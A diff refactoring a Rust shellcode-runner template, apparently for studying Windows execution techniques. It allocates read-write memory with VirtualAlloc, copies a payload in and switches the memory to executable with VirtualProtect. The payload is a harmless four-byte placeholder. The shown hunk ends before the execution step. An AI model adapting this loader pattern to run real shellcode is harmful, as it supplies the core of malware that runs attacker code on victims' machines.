@@ -14,7 +14,7 @@ Technique:
     - execution:  unsafe call to function pointer
 */
 
-use std::{mem, process, ptr};
+use std::{mem, ptr};
 use winapi::um::{
     errhandlingapi::GetLastError,
     memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect},
@@ -28,34 +28,32 @@ use winapi::um::{
     },
 };
 
-type DWORD = u32;
-
 fn main() {
     // shellcode storage in stack
     let payload: [u8; 4] = [0x90, 0x90, 0xCC, 0xC3];
-    let mut old_protect: DWORD = PAGE_READWRITE;
+    let mut old_protect = PAGE_READWRITE;
 
     unsafe {
         // allocate memory buffer for payload as READ-WRITE (no executable)
         let runtime = VirtualAlloc(
             ptr::null_mut(),
-            payload.len().try_into().unwrap(),
+            payload.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
 
         if runtime.is_null() {
             println!("[-] unable to allocate");
-            process::exit(1);
+            return;
         }
 
         // copy payload to the buffer
-        std::ptr::copy(payload.as_ptr(), runtime.cast(), payload.len());
+        ptr::copy(payload.as_ptr(), runtime.cast(), payload.len());
 
         // make buffer executable (R-X)
         let retval = VirtualProtect (
             runtime,
-            payload.len() as usize,
+            payload.len(),
             PAGE_EXECUTE_READ,
             &mut old_protect
         );
